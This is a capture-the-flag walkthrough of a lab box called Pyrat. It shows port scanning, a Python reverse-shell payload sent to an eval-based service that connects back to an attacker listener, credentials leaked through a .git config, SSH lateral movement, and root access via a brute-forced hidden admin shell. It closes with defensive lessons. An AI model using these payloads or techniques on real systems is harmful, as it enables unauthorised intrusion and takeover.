# Pyrat

**Difficulty:** Easy
**Techniques:** Python socket RCE · git-leaked credentials · login brute force → root

## Recon
```bash
nmap -sC -sV -p- -oN portscan.nmap <ip>
```
```
22/tcp   open  ssh      OpenSSH 8.2p1
8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
```
Port 8000 behaves oddly — sending text returns Python errors like
`name 'GET' is not defined`, i.e. **input is evaluated as Python** (`eval`).

## Foothold — Python eval RCE
A reverse shell paid off by feeding Python to the socket. Listener:
```bash
nc -lvnp 4444
```
Payload sent to port 8000 (Python reverse shell):
```python
import socket,subprocess,os;s=socket.socket();s.connect(("<attacker>",4444));
os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
import pty;pty.spawn("/bin/bash")
```
Shell as `www-data`.

## Enumeration — leaked git credentials
```bash
cd /opt/dev/.git && cat config
```
```
[user]  name = Jose Mario ... email = josemlwdf@github.com
[credential "https://github.com"]
    username = think
    password = _TH1NKIN****ate$_
```
A `.git` directory left on disk leaked a developer's credentials.

## Lateral movement
```bash
ssh think@<ip>      # password from the git config
cat user.txt        # THM{REDACTED}
```

## Privilege escalation — the hidden admin command
`git show` on the repo revealed the service's source: port 8000 accepts a hidden
`admin` auth flow that, once authenticated, exposes a `shell` command running as
root. The username/password were brute-forced with small custom scripts:
```
[+] Input found: admin
[+] Password found: abc123
```
```bash
nc <ip> 8000
admin
Password: abc123
Welcome Admin!!! Type "shell" to begin
shell
# id  →  uid=0(root)
```
`root.txt` → `THM{REDACTED}`.

## Lessons
- Never `eval()` network input — it is remote code execution by design.
- A committed `.git` directory leaks history and secrets; keep it out of web roots.
- Reading the app's own source (via the leaked repo) revealed the privesc path —
  source review is a core recon step.
